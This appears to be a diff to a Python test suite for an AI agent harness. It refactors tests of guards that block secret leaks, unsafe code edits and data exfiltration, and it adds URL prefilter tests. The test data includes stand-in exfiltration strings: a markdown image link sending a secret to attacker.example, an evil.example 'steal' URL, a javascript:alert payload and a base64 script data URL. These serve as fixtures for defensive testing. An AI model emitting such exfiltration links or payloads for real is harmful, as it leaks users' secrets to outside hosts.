@@ -14,20 +14,15 @@ from ai_agent_harness import (
     Autonomy,
     BaseTool,
     EgressGuard,
-    Message,
-    ModelResponse,
     ProtectedPaths,
     ReadFile,
     Risk,
     RunState,
     RunStatus,
     SecretGuard,
-    StopReason,
-    TextBlock,
     ToolCall,
     ToolError,
     ToolExecutor,
-    ToolInvocation,
     ToolRegistry,
     ToolResult,
     WeakeningGuard,
@@ -40,7 +35,7 @@ from ai_agent_harness.core.hooks import Action
 from ai_agent_harness.testing import FakeProvider, text_response, tool_response
 from ai_agent_harness.tools.builtin import ReadFileInput
 
-from .conftest import PathInput, WriteFile, results_of, run_sync
+from .conftest import PathInput, WriteFile, invocation, results_of, run_sync
 
 
 class PayloadInput(BaseModel):
@@ -91,13 +86,7 @@ class TestSecretGuard:
     def test_blocks_secrets_in_before_tool_and_after_tool_without_echoing_secret(self) -> None:
         guard = SecretGuard(check_user_input=True)
         secret = "hf_SecretTokenValue1234567890abc"
-        call = ToolCall(id="1", name="send", arguments={"text": "ok", "nested": {"k": [secret]}})
-        inv = ToolInvocation(
-            call=call,
-            tool_name="send",
-            risk=Risk.WRITE,
-            args=PayloadInput(text="ok", nested={"k": [secret]}),
-        )
+        inv = invocation(PayloadInput(text="ok", nested={"k": [secret]}), name="send")
         before = run_sync(guard.before_tool(RunState(agent_name="a"), inv))
         assert before.action is Action.BLOCK
         assert "api_token" in (before.reason or "")
@@ -106,7 +95,7 @@ class TestSecretGuard:
         after = run_sync(
             guard.after_tool(
                 RunState(agent_name="a"),
-                ToolInvocation(call=call, tool_name="send", risk=Risk.READ, args=PayloadInput(text="ok")),
+                invocation(PayloadInput(text="ok"), name="send", risk=Risk.READ),
                 ToolResult(call_id="1", content=f"File content: {secret}"),
             )
         )
@@ -159,39 +148,16 @@ class TestEgressGuard:
 
     def test_blocks_tool_arguments_and_markdown_exfiltration_in_model_output(self) -> None:
         guard = EgressGuard(allowed_domains=["docs.example.com"])
-        call = ToolCall(id="1", name="fetch", arguments={"text": "See https://evil.example/steal?x=1"})
-        inv = ToolInvocation(
-            call=call,
-            tool_name="fetch",
-            risk=Risk.READ,
-            args=PayloadInput(text="See https://evil.example/steal?x=1"),
-        )
+        inv = invocation(PayloadInput(text="See https://evil.example/steal?x=1"), name="fetch", risk=Risk.READ)
         assert run_sync(guard.before_tool(RunState(agent_name="a"), inv)).action is Action.BLOCK
 
-        ok_inv = ToolInvocation(
-            call=call,
-            tool_name="fetch",
-            risk=Risk.READ,
-            args=PayloadInput(text="See https://docs.example.com/guide."),
-        )
+        ok_inv = invocation(PayloadInput(text="See https://docs.example.com/guide."), name="fetch", risk=Risk.READ)
         assert run_sync(guard.before_tool(RunState(agent_name="a"), ok_inv)).action is Action.CONTINUE
 
-        exfil_response = ModelResponse(
-            message=Message(
-                role="assistant",
-                content=(TextBlock(text="Here is the image: ![img](https://attacker.example/collect?secret=42)"),),
-            ),
-            stop_reason=StopReason.END,
-        )
+        exfil_response = text_response("Here is the image: ![img](https://attacker.example/collect?secret=42)")
         assert run_sync(guard.after_model(RunState(agent_name="a"), exfil_response)).action is Action.BLOCK
 
-        safe_response = ModelResponse(
-            message=Message(
-                role="assistant",
-                content=(TextBlock(text="Read more at [Docs](https://docs.example.com/start)."),),
-            ),
-            stop_reason=StopReason.END,
-        )
+        safe_response = text_response("Read more at [Docs](https://docs.example.com/start).")
         assert run_sync(guard.after_model(RunState(agent_name="a"), safe_response)).action is Action.CONTINUE
 
 
@@ -212,21 +178,10 @@ class TestWeakeningGuard:
     def test_blocks_weakening_directives_on_write_tools(self, snippet: str) -> None:
         guard = WeakeningGuard()
         assert guard.check_text(snippet) is not None
-        call = ToolCall(id="1", name="write_file", arguments={"path": "src/a.py", "content": snippet})
-        inv = ToolInvocation(
-            call=call,
-            tool_name="write_file",
-            risk=Risk.WRITE,
-            args=PathInput(path="src/a.py", content=snippet),
-        )
+        inv = invocation(PathInput(path="src/a.py", content=snippet), name="write_file")
         assert run_sync(guard.before_tool(RunState(agent_name="a"), inv)).action is Action.BLOCK
         # READ tools are not blocked
-        read_inv = ToolInvocation(
-            call=call,
-            tool_name="read_file",
-            risk=Risk.READ,
-            args=PathInput(path="src/a.py", content=snippet),
-        )
+        read_inv = invocation(PathInput(path="src/a.py", content=snippet), name="read_file", risk=Risk.READ)
         assert run_sync(guard.before_tool(RunState(agent_name="a"), read_inv)).action is Action.CONTINUE
 
     def test_clean_code_is_allowed(self) -> None:
@@ -359,3 +314,26 @@ class TestToolIntegrityAndUntrustedOutput:
 
         with pytest.raises(ConfigError, match="untrusted_output"):
             BadFlag.validate_definition()
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "see https://evil.example/x",
+        "SHOUT HTTP://EVIL.EXAMPLE",
+        "mail mailto:someone@evil.example now",
+        "data:text/html;base64,PHNjcmlwdD4=",
+        "javascript:alert(1)",
+        "file:\\\\evil\\share",
+        "ftp:/evil.example",
+        "MAILTO:x@y.example",  # schemes are case-insensitive (RFC 3986, WHATWG)
+        "JavaScript:alert(1)",
+    ],
+)
+def test_the_egress_prefilter_never_skips_a_url(text: str) -> None:
+    assert EgressGuard(allowed_domains=[]).check_text(text) is not None
+
+
+@pytest.mark.parametrize("text", ["", "plain text: no link here", "ratio 3:4 and a/b", "MAILTO: no address here"])
+def test_text_without_a_url_passes_the_egress_check(text: str) -> None:
+    assert EgressGuard(allowed_domains=[]).check_text(text) is None
